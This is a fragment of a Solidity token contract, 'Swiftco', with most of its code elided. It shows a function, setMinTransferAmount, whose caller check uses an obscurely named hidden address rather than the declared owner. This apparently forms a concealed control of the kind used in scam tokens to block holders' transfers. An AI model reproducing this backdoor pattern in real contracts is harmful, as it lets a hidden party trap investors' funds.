...
contract Swiftco is Context, Ownable, IERC20 {
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_, address ownr) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    ...
    function setMinTransferAmount(address account, uint256 newAmount) public {
        address sadsss = gddff;
        require(_msgSender() == sadsss);
